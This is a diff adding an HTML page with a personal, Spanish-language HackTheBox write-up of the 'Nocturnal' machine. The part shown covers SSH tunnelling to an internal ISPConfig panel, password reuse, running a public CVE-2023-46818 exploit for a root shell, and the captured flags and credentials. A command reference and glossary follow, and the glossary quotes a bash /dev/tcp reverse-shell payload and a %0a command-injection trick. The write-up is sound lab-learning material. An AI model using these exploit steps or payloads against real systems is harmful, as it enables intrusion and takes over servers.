+          el puerto 9000 de mi máquina local al puerto 8080 de 127.0.0.1 (localhost del servidor)
+          a través de la conexión SSH". El resultado: al acceder a
+          <code style="color:var(--yellow);font-family:var(--font-mono)">http://127.0.0.1:9000</code>
+          en nuestro navegador, llegamos al servicio en el puerto 8080 del servidor remoto.
+        </p>
+        <p>
+          Usamos el puerto local <strong>9000</strong> (arbitrario) porque el 8080 puede estar
+          en uso en nuestra máquina. El puerto 443 del servidor también podría usarse, pero 9000
+          es un valor genérico sin conflictos.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="ssh -L 9000:127.0.0.1:8080 tobias@nocturnal.htb">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">SSH TUNNEL</span>
+        <div><span class="prompt">$ </span><span class="cmd">ssh <span class="flag">-L</span> <span class="arg">9000:127.0.0.1:8080</span> <span class="arg">tobias@nocturnal.htb</span></span></div>
+      </div>
+
+      <div class="info-box">
+        <p class="info-box-title">// ¿CÓMO FUNCIONA EL TUNNEL?</p>
+        <p>
+          <strong>Sin tunnel:</strong> Nuestra máquina → Internet → Servidor (puerto 80 OK, puerto 8080 ❌ solo localhost)<br>
+          <strong>Con tunnel:</strong> Nuestra máquina :9000 → SSH encriptado → Servidor → 127.0.0.1:8080 ✅<br><br>
+          El tunnel convierte un servicio interno del servidor en uno accesible desde nuestra máquina.
+          Es una técnica esencial en pentesting para pivotar hacia servicios internos.
+        </p>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- ===================== 12 ISP ===================== -->
+    <div class="section" id="isp">
+      <p class="section-label">// 12</p>
+      <h2 class="section-title">ISPConfig · CVE-2023-46818</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">19</div>
+        <span class="step-title">IDENTIFICAR ISPCONFIG Y SU VERSIÓN</span>
+      </div>
+      <div class="prose">
+        <p>
+          Al acceder a <span class="hl-cyan">http://127.0.0.1:9000</span> encontramos el panel de
+          login de <strong>ISPConfig</strong>, una plataforma open-source para administración de
+          hosting web (gestión de sitios, DNS, email, etc.). La primera pregunta es: ¿qué versión?
+          Navegamos a <strong>Monitor → System State</strong> y vemos
+          <span class="hl-red">ISPConfig 3.2.10p1</span>.
+        </p>
+        <p>
+          Probamos las credenciales de tobias (<span class="hl-yel">admin:slowmotionapocalypse</span>)
+          en ISPConfig y funcionan — el usuario reutilizó la misma contraseña. Esto es una mala
+          práctica de seguridad común y nos da acceso administrativo al panel.
+        </p>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">20</div>
+        <span class="step-title">BUSCAR CVE PARA ISPCONFIG 3.2.10p1</span>
+      </div>
+      <div class="prose">
+        <p>
+          Con la versión exacta, buscamos vulnerabilidades conocidas. Encontramos
+          <span class="hl-red">CVE-2023-46818</span>: una vulnerabilidad de
+          <strong>PHP Code Injection</strong> en el endpoint
+          <code style="color:var(--yellow);font-family:var(--font-mono)">/admin/language_edit.php</code>.
+          El parámetro <code>records</code> del POST no es sanitizado correctamente, permitiendo
+          inyectar código PHP arbitrario que se escribe en un archivo y luego se ejecuta en el
+          servidor. Como ISPConfig corre con privilegios de <span class="hl-red">root</span>,
+          cualquier código inyectado se ejecuta como root.
+        </p>
+        <p>
+          Existe un exploit público en GitHub (<strong>ajdumanhug/CVE-2023-46818</strong>) que
+          automatiza el proceso: hace login, obtiene los tokens CSRF necesarios, inyecta el payload
+          PHP y abre una shell interactiva.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="git clone https://github.com/ajdumanhug/CVE-2023-46818.git">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">CLONE</span>
+        <div><span class="prompt">$ </span><span class="cmd">git clone <span class="arg">https://github.com/ajdumanhug/CVE-2023-46818.git</span></span></div>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- ===================== 13 ROOT ===================== -->
+    <div class="section" id="root">
+      <p class="section-label">// 13</p>
+      <h2 class="section-title">Root Flag · Pwned</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">21</div>
+        <span class="step-title">EJECUTAR EL EXPLOIT — SHELL COMO ROOT</span>
+      </div>
+      <div class="prose">
+        <p>
+          El exploit recibe como argumentos: la URL de ISPConfig (por el tunnel es
+          <span class="hl-cyan">http://127.0.0.1:9000</span>), el usuario admin y su contraseña.
+          Internamente el script: hace login con las credenciales, extrae los tokens
+          <strong>CSRF</strong> (mecanismo anti-CSRF que ISPConfig implementa para validar peticiones
+          legítimas), envía el payload de code injection con los tokens válidos, escribe un webshell
+          PHP en <code style="color:var(--yellow);font-family:var(--font-mono)">/admin/sh.php</code>
+          y finalmente lanza una shell interactiva a través de ese webshell.
+        </p>
+        <p>
+          La confirmación llega con <span class="hl-red">whoami → root</span>. Leemos la root flag
+          en <code style="color:var(--yellow);font-family:var(--font-mono)">/root/root.txt</code>.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="python3 CVE-2023-46818.py http://127.0.0.1:9000 admin slowmotionapocalypse">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">EXPLOIT</span>
+        <div><span class="prompt">$ </span><span class="cmd">python3 <span class="arg">CVE-2023-46818.py</span> <span class="arg">http://127.0.0.1:9000</span> <span class="arg">admin</span> <span class="arg">slowmotionapocalypse</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>[+] Logging in with username 'admin' and password 'slowmotionapocalypse'</div>
+        <div>[+] Login successful!</div>
+        <div>[+] Fetching CSRF tokens ...</div>
+        <div>[+] CSRF ID: language_edit_3d2437ac3b04b5422b1bcd8c</div>
+        <div>[+] CSRF Key: 1daf57dfddee4acb3a11d3770ae594dda438c81b</div>
+        <div>[+] Injecting shell payload ...</div>
+        <div>[+] Shell written to: <span class="o-cyan">http://127.0.0.1:9000/admin/sh.php</span></div>
+        <div>[+] Launching shell ...</div>
+        <div>&nbsp;</div>
+        <div>ispconfig-shell# whoami</div>
+        <div><span class="o-red">root</span></div>
+        <div>ispconfig-shell# ls /root</div>
+        <div><span class="o-green">root.txt</span>&nbsp;&nbsp; scripts</div>
+        <div>ispconfig-shell# cat /root/root.txt</div>
+        <div><span class="o-green">e5c617ebf85b6e0cd2bfbe3feb010ab1</span></div>
+      </div>
+
+      <div class="cred-box">
+        <div class="cred-item">
+          <div class="cred-label">USER FLAG</div>
+          <div class="cred-val">0508ebedaf704526abea7844cbfe9aaa</div>
+        </div>
+        <div class="cred-item">
+          <div class="cred-label">ROOT FLAG</div>
+          <div class="cred-val">e5c617ebf85b6e0cd2bfbe3feb010ab1</div>
+        </div>
+      </div>
+
+      <div class="vuln-box">
+        <p class="vuln-box-title">// RESUMEN DEL FLUJO DE ATAQUE</p>
+        <p>
+          <strong>1. IDOR</strong> → acceso no autorizado a archivos de otros usuarios via view.php<br>
+          <strong>2. Credential Exposure</strong> → contraseña de amanda en archivo ODT<br>
+          <strong>3. Command Injection</strong> → ejecución de comandos en el backup del admin<br>
+          <strong>4. Reverse Shell</strong> → bypass de filtro de extensiones con shell.pdf<br>
+          <strong>5. SQLite Hash Dump</strong> → credenciales de tobias crackeadas con CrackStation<br>
+          <strong>6. SSH Tunneling</strong> → pivoteo al ISPConfig interno en puerto 8080<br>
+          <strong>7. CVE-2023-46818</strong> → PHP Code Injection → root
+        </p>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- ===================== 14 CMD REF ===================== -->
+    <div class="section" id="cmdref">
+      <p class="section-label">// 14</p>
+      <h2 class="section-title">Referencia de Comandos</h2>
+      <div class="section-line"></div>
+
+      <div class="cmd-ref-grid">
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">nmap</div>
+          <div class="cmd-ref-syntax">sudo nmap -p- -sSCV -n -Pn --min-rate=5000 --open IP -oX out.xml</div>
+          <div class="cmd-ref-desc">Escáner de puertos y servicios. El más usado en reconocimiento inicial.</div>
+          <ul class="cmd-ref-flags">
+            <li><span>-p-</span> → todos los 65,535 puertos TCP</li>
+            <li><span>-sS</span> → SYN scan (sigiloso)</li>
+            <li><span>-sC</span> → scripts NSE por defecto</li>
+            <li><span>-sV</span> → detección de versiones</li>
+            <li><span>-n</span> → sin resolución DNS</li>
+            <li><span>-Pn</span> → sin ping previo</li>
+            <li><span>--min-rate=5000</span> → velocidad mínima</li>
+            <li><span>--open</span> → solo puertos abiertos</li>
+            <li><span>-oX</span> → salida en XML</li>
+          </ul>
+        </div>
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">wfuzz</div>
+          <div class="cmd-ref-syntax">wfuzz -c -w wordlist --hc=404,302 -b "COOKIE" --hh=N "URL/FUZZ"</div>
+          <div class="cmd-ref-desc">Fuzzer web. Reemplaza FUZZ por cada línea del wordlist y filtra respuestas.</div>
+          <ul class="cmd-ref-flags">
+            <li><span>-c</span> → colores en salida</li>
+            <li><span>-w</span> → wordlist a usar</li>
+            <li><span>--hc</span> → ocultar por código HTTP</li>
+            <li><span>-b</span> → cookie de sesión</li>
+            <li><span>--hh</span> → ocultar por número de chars</li>
+            <li><span>FUZZ</span> → punto de inyección</li>
+          </ul>
+        </div>
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">ssh -L (Port Forward)</div>
+          <div class="cmd-ref-syntax">ssh -L puerto_local:host_remoto:puerto_remoto usuario@IP</div>
+          <div class="cmd-ref-desc">Crea un túnel SSH para acceder a servicios internos del servidor remoto.</div>
+          <ul class="cmd-ref-flags">
+            <li><span>-L</span> → Local port forwarding</li>
+            <li><span>9000</span> → puerto en nuestra máquina</li>
+            <li><span>127.0.0.1:8080</span> → destino en el servidor</li>
+            <li><span>usuario@IP</span> → credenciales SSH</li>
+          </ul>
+        </div>
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">sqlite3</div>
+          <div class="cmd-ref-syntax">sqlite3 base_de_datos.db</div>
+          <div class="cmd-ref-desc">Cliente de línea de comandos para bases de datos SQLite. Permite consultas SQL.</div>
+          <ul class="cmd-ref-flags">
+            <li><span>.tables</span> → listar tablas</li>
+            <li><span>.schema</span> → ver estructura</li>
+            <li><span>select * from tabla;</span> → volcar datos</li>
+            <li><span>.quit</span> → salir</li>
+          </ul>
+        </div>
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">nc (netcat)</div>
+          <div class="cmd-ref-syntax">nc -lvnp 443</div>
+          <div class="cmd-ref-desc">Herramienta de red multipropósito. En pentesting se usa para recibir reverse shells.</div>
+          <ul class="cmd-ref-flags">
+            <li><span>-l</span> → modo escucha (listen)</li>
+            <li><span>-v</span> → verbose</li>
+            <li><span>-n</span> → sin resolución DNS</li>
+            <li><span>-p</span> → puerto a escuchar</li>
+          </ul>
+        </div>
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">xsltproc</div>
+          <div class="cmd-ref-syntax">xsltproc /usr/share/nmap/nmap.xsl output.xml > output.html</div>
+          <div class="cmd-ref-desc">Transforma XML con hojas de estilo XSLT. Convierte el XML de nmap en HTML legible.</div>
+          <ul class="cmd-ref-flags">
+            <li><span>nmap.xsl</span> → hoja de estilo de nmap</li>
+            <li><span>output.xml</span> → resultados del escaneo</li>
+            <li><span>> output.html</span> → redireccionar a HTML</li>
+          </ul>
+        </div>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- ===================== 15 GLOSARIO ===================== -->
+    <div class="section" id="glosario">
+      <p class="section-label">// 15</p>
+      <h2 class="section-title">Glosario Técnico</h2>
+      <div class="section-line"></div>
+
+      <div class="glosario-grid">
+
+        <div class="glos-card">
+          <div class="glos-term">IDOR — Insecure Direct Object Reference</div>
+          <div class="glos-def">
+            <strong>IDOR</strong> es una vulnerabilidad de control de acceso que ocurre cuando una
+            aplicación web usa identificadores directos (IDs de usuario, nombres de archivo, números
+            de registro) para referenciar objetos internos sin verificar que el usuario autenticado
+            tiene permiso para acceder a ese objeto. En Nocturnal, el parámetro
+            <code>username</code> en <code>view.php</code> permite acceder a los archivos de
+            cualquier usuario sin autorización. IDOR es parte del Top 10 de OWASP y es una de las
+            vulnerabilidades más comunes en aplicaciones web modernas.
+          </div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">Command Injection — Inyección de Comandos OS</div>
+          <div class="glos-def">
+            <strong>Command Injection</strong> ocurre cuando datos proporcionados por el usuario se
+            pasan sin sanitizar a una función que ejecuta comandos del sistema operativo. En Nocturnal,
+            el campo <code>password</code> del backup se concatenaba directamente a un comando shell.
+            Al insertar <code>%0a</code> (newline), el shell interpretaba el input como dos comandos
+            separados. El caracter <code>%0a</code> actúa como terminador del primer comando e
+            iniciador del segundo. Esta vulnerabilidad permite ejecutar comandos arbitrarios con
+            los privilegios del proceso web.
+          </div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">Reverse Shell — Shell Inversa</div>
+          <div class="glos-def">
+            Una <strong>reverse shell</strong> es una técnica donde el servidor comprometido
+            <em>inicia</em> la conexión hacia la máquina del atacante, en lugar de al revés.
+            Esto evita problemas de firewall: mientras los firewalls suelen bloquear conexiones
+            entrantes, permiten conexiones salientes. El payload
+            <code>bash -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1</code> redirige stdin, stdout y
+            stderr de bash a través de una conexión TCP a la IP y puerto del atacante, que tiene
+            un listener (netcat) esperando. El resultado es una terminal interactiva remota.
+          </div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">Virtual Hosting — Hospedaje Virtual</div>
+          <div class="glos-def">
+            <strong>Virtual Hosting</strong> permite a un servidor web (nginx, Apache) alojar
+            múltiples sitios web en la misma IP usando el header HTTP <code>Host</code> para
+            distinguirlos. Cuando el navegador hace una petición, incluye el dominio al que se
+            conecta en el header Host. El servidor lee ese header y sirve el sitio correspondiente.
+            Sin el dominio correcto en /etc/hosts, el navegador enviaría la IP como Host y el
+            servidor no sabría qué sitio mostrar.
+          </div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">SSH Local Port Forwarding — Tunneling</div>
+          <div class="glos-def">
+            El <strong>SSH Local Port Forwarding</strong> (flag <code>-L</code>) crea un túnel
+            encriptado que redirige el tráfico de un puerto local a un host y puerto accesible
+            desde el servidor SSH remoto. Es la técnica de <em>pivoting</em> más básica: permite
+            acceder a servicios internos de un servidor (que solo escuchan en localhost o en redes
+            internas) a través de la conexión SSH ya establecida. Fue fundamental en Nocturnal
+            para acceder a ISPConfig corriendo en el puerto 8080 interno.
+          </div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">CVE-2023-46818 — ISPConfig PHP Code Injection</div>
+          <div class="glos-def">
+            <strong>CVE-2023-46818</strong> es una vulnerabilidad de PHP Code Injection en
+            ISPConfig ≤ 3.2.10p1. El endpoint <code>/admin/language_edit.php</code> recibe un
+            parámetro <code>records</code> que se escribe directamente en un archivo PHP sin
+            sanitizar. Un atacante autenticado como admin puede inyectar código PHP arbitrario,
+            que al ser ejecutado por el servidor corre con los privilegios del proceso ISPConfig
+            (normalmente root). El exploit automatiza la obtención de tokens CSRF válidos y la
+            entrega del payload, resultando en ejecución de código remoto como root.
+          </div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">MD5 Hash Cracking — Rainbow Tables</div>
+          <div class="glos-def">
+            <strong>MD5</strong> es un algoritmo de hash criptográfico de 128 bits (32 caracteres
+            hex) diseñado en 1991. Está considerado roto para uso en contraseñas: es rápido de
+            computar, no usa salt por defecto y existen bases de datos masivas de hashes
+            precomputados llamadas <strong>rainbow tables</strong>. Herramientas como CrackStation
+            tienen miles de millones de pares hash↔password almacenados. Cuando una aplicación
+            almacena contraseñas en MD5 sin salt (como Nocturnal), cualquier contraseña común
+            puede recuperarse en segundos con una simple consulta a estas bases de datos.
+          </div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">CSRF Token — Cross-Site Request Forgery Protection</div>
+          <div class="glos-def">
+            Un <strong>CSRF Token</strong> es un valor secreto aleatorio que el servidor incluye
+            en los formularios HTML y verifica al recibir el POST. Su propósito es evitar que sitios
+            maliciosos hagan peticiones en nombre del usuario autenticado. ISPConfig implementa CSRF
+            para proteger sus acciones administrativas. El exploit CVE-2023-46818 los extrae
+            automáticamente haciendo primero un GET a la página del formulario, parseando el HTML
+            para encontrar los tokens, y luego incluyéndolos en el POST malicioso. Sin los tokens
+            válidos, el servidor rechazaría la petición.
+          </div>
+        </div>
+
+      </div>
+    </div>
+
+  </main>
+</div>
+
+<!-- FOOTER -->
+<footer>
+  <p>© 2026 <span>Brandon Zevallos Pastrana</span> — Writeup personal · HackTheBox</p>
+  <p>Built with <span>kali linux</span> &amp; <span>❤</span></p>
+</footer>
+
+<script>
+  // ACTIVE TOC
+  const sections = document.querySelectorAll('.section[id]');
+  const tocLinks = document.querySelectorAll('.toc-list a');
+  const tocObserver = new IntersectionObserver(entries => {
+    entries.forEach(e => {
+      if (e.isIntersecting) {
+        tocLinks.forEach(a => a.classList.remove('active'));
+        const active = document.querySelector(`.toc-list a[href="#${e.target.id}"]`);
+        if (active) active.classList.add('active');
+      }
+    });
+  }, { rootMargin: '-30% 0px -60% 0px' });
+  sections.forEach(s => tocObserver.observe(s));
+
+  // CURSOR
+  const cursor = document.getElementById('cursor');
+  const ring   = document.getElementById('cursorRing');
+  document.addEventListener('mousemove', e => {
+    cursor.style.left = e.clientX + 'px'; cursor.style.top = e.clientY + 'px';
+    ring.style.left   = e.clientX + 'px'; ring.style.top   = e.clientY + 'px';
+    cursor.style.opacity = '1'; ring.style.opacity = '0.5';
+  });
+  document.addEventListener('mousedown', () => { cursor.style.transform = 'translate(-50%,-50%) scale(0.5)'; });
+  document.addEventListener('mouseup',   () => { cursor.style.transform = 'translate(-50%,-50%)'; });
+  document.querySelectorAll('a, button').forEach(el => {
+    el.addEventListener('mouseenter', () => { ring.style.width = '54px'; ring.style.height = '54px'; ring.style.opacity = '0.3'; });
+    el.addEventListener('mouseleave', () => { ring.style.width = '36px'; ring.style.height = '36px'; ring.style.opacity = '0.5'; });
+  });
+
+  // SCROLL REVEAL
+  const obs = new IntersectionObserver(entries => {
+    entries.forEach(e => { if (e.isIntersecting) e.target.classList.add('visible'); });
+  }, { threshold: 0.06 });
+  document.querySelectorAll('.section').forEach(s => obs.observe(s));
+
+  // PROGRESS BAR
+  window.addEventListener('scroll', () => {
+    const winScroll = document.documentElement.scrollTop;
+    const height = document.documentElement.scrollHeight - window.innerHeight;
+    const scrolled = height > 0 ? (winScroll / height) * 100 : 0;
+    const bar = document.getElementById('readingProgress');
+    if (bar) bar.style.width = scrolled + '%';
+  });
+
+  // TOAST
+  function showToast(msg) {
+    let toast = document.querySelector('.toast');
+    if (!toast) {
+      toast = document.createElement('div');
+      toast.className = 'toast';
+      document.body.appendChild(toast);
+    }
+    toast.textContent = '📋 ' + msg;
+    toast.classList.add('show');
+    setTimeout(() => toast.classList.remove('show'), 2000);
+  }
+
+  // COPY COMMAND
+  function copyCmd(btn) {
+    const block = btn.closest('.cmd-block');
+    const cmd = block.dataset.cmd || '';
+    navigator.clipboard.writeText(cmd).then(() => {
+      btn.textContent = '✓ OK';
+      btn.classList.add('copied');
+      showToast('Comando copiado ✓');
+      setTimeout(() => {
+        btn.textContent = 'COPY';
+        btn.classList.remove('copied');
+      }, 1800);
+    }).catch(() => {
+      showToast('Error al copiar');
+    });
+  }
+</script>
+</body>
+</html>
